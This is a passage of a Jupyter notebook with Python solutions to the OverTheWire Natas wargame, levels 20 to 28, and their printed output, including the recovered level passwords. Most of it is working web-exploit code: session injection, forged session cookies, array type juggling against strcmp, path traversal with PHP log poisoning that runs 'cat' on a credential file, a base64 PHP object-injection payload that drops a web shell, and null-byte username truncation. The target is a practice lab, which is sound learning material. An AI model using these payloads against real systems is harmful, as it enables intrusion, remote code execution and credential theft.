     "output_type": "stream",
     "text": [
      "1361\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "password not found.\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "1527\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Reading from /var/lib/php/sessions/mysess_key<br>DEBUG: Read [name admin]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21\n",
      "Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";admin|s:1:\"1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: admin => 1<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "password found: fBPhv63cKE1lkQl04cE5CuFTzXe15NfiH\n"
     ]
    }
   ],
   "source": [
    "#natas20\n",
    "count = 20\n",
    "init()\n",
    "\n",
    "while 'natas21' not in pwd:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/index.php?debug=1'\n",
    "    cookies = dict(PHPSESSID='key')\n",
    "    params = dict(name='admin\\nadmin 1')\n",
    "    result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies, params=params)\n",
    "    print(len(result.text))\n",
    "    print(result.text)\n",
    "    if find_pwd(result):\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas21"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas21\n",
    "count = 21\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}-experimenter.natas.labs.overthewire.org/index.php?submit=1&admin=1&bgcolor=blue&debug=1'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "cookies = dict(PHPSESSID=res.cookies.get('PHPSESSID'))\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas22"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fdIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas22\n",
    "count = 22\n",
    "init()\n",
    "\n",
    "cookies = dict(PHPSESSID='1')\n",
    "params = dict(revelio=1)\n",
    "result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies, params=params, allow_redirects=False)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas23"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fMeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas23\n",
    "count = 23\n",
    "init()\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/?passwd=11iloveyou'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas24"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas24\", \"pass\": \"MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd\" };</script></head>\n",
      "<body>\n",
      "<h1>natas24</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "Password:\n",
      "<form name=\"input\" method=\"get\">\n",
      "    <input type=\"text\" name=\"passwd\" size=20>\n",
      "    <input type=\"submit\" value=\"Login\">\n",
      "</form>\n",
      "\n",
      "<br />\n",
      "<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />\n",
      "<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>  \n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: fckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas24\n",
    "count = 24\n",
    "init()\n",
    "\n",
    "passwd = ''\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org?passwd[]={passwd}'\n",
    "result = requests.get(url, auth=(natas, pwd[natas]))\n",
    "print(result.text)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas25"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fcVXXwxMS3Y26n5UZU89QgpGmWCelaQlE\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas25\n",
    "count = 25\n",
    "init()\n",
    "\n",
    "res = requests.get(url, auth=auth)\n",
    "cookies = res.cookies.get_dict()\n",
    "\n",
    "lang = f'....//....//....//....//....//var/www/natas/natas25/logs/natas25_{cookies[\"PHPSESSID\"]}.log'\n",
    "\n",
    "params = dict(lang=lang)\n",
    "header = {'User-Agent': '<?php system(\"cat /etc/natas_webpass/natas26\"); ?>'}\n",
    "result = requests.get(url, auth=(natas, pwd[natas]), params=params, headers=header, cookies=cookies)\n",
    "# print(result.text)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas26"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas26\", \"pass\": \"cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE\" };</script></head>\n",
      "<body>\n",
      "\n",
      "<h1>natas26</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "Draw a line:<br>\n",
      "<form name=\"input\" method=\"get\">\n",
      "X1<input type=\"text\" name=\"x1\" size=2>\n",
      "Y1<input type=\"text\" name=\"y1\" size=2>\n",
      "X2<input type=\"text\" name=\"x2\" size=2>\n",
      "Y2<input type=\"text\" name=\"y2\" size=2>\n",
      "<input type=\"submit\" value=\"DRAW!\">\n",
      "</form>\n",
      "\n",
      "<img src=\"img/natas26_a0e61oj9sp713jau8h8uk40bt1.png\"><br />\n",
      "<b>Fatal error</b>:  Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105\n",
      "Stack trace:\n",
      "#0 /var/www/natas/natas26/index.php(131): storeData()\n",
      "#1 {main}\n",
      "  thrown in <b>/var/www/natas/natas26/index.php</b> on line <b>105</b><br />\n",
      "\n",
      "password found: fu3RRffXjysjgwFU6b9xa23i6prmUsYne\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas26\n",
    "count = 26\n",
    "init()\n",
    "\n",
    "PHP_base64_encoded_payload = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL2V4cGxvaXQxLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTc6Ijw/cGhwIGVjaG8gcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=='\n",
    "cookies = dict(drawing=PHP_base64_encoded_payload)\n",
    "res = requests.get(url, auth=auth, cookies=cookies)\n",
    "print(res.text)\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/img/exploit1.php'\n",
    "res = requests.get(url, auth=auth)\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas27"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#natas27\n",
    "count = 27\n",
    "\n",
    "natas = f'natas{count}'\n",
    "init()\n",
    "\n",
    "# First request add a user, username is natas28 and password is empty\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org'\n",
    "username = 'natas' + '\\00' * 57 + '28' + '1' # natas28\n",
    "password = ''\n",
    "params = dict(username=username, password=password)\n",
    "result = requests.get(url, auth=auth, params=params)\n",
    "\n",
    "# Second request get user with username is natas28 and password is empty\n",
    "username = 'natas28'\n",
    "password = ''\n",
    "params = dict(username=username, password=password)\n",
    "result = requests.get(url, auth=auth, params=params)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas28"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "#natas28\n",
    "count = 28\n",
    "init()\n",
    "\n",
    "test = {}\n",
    "\n",
    "query = ''\n",
    "param = {\"query\": query}\n",
    "res = requests.get(url, auth=auth, params=param)\n",
    "query2 = res.url.split('query=')[1]\n",
    "test[query] = [query2, urllib.parse.unquote(query2), base64.b64decode(urllib.parse.unquote(query2))]\n",
    "\n",
    "# for i in range(0, 20):\n",
    "#     query = 'a' * 12 + 'a' * 16 * i\n",
    "#     param = {\"query\": query}\n",
    "#     res = requests.get(url, auth=auth, params=param)\n",
    "#     query2 = res.url.split('query=')[1]\n",
    "#     test[query] = [query2, urllib.parse.unquote(query2), base64.b64decode(urllib.parse.unquote(query2))]\n",
    "#     print(f'progress: {i}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ": 0 80\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xe8\\x7f\\xf6\\x0c\\x99\\xadr\\xcc\\xbd\\x94~4\\x17\\xa9\\x01(\\xa7~\\x8e\\xd1\\xaa\\xbe\\x0b]\\x05\\xc4\\xff\\xe6\\xac\\x14#\\xabG\\x8e\\xb1\\xa1\\xfe&\\x1a,l\\x15\\x06\\x11\\t\\xb3\\xfe\\xda'\n",
      "aaaaaaaaaaaa: 12 80\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaa: 28 96\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 44 112\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 60 128\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 76 144\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 92 160\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 108 176\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 124 192\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 140 208\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\\xce\\x82\\xa9U;e\\xb8\\x12\\x80\\xfbm;\\xf2\\x90\\x0fGu\\xfdPD\\xfd\\x06=&\\xf6\\xbb\\x7fsKA\\xc8\\x99'\n",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 156 224\n",
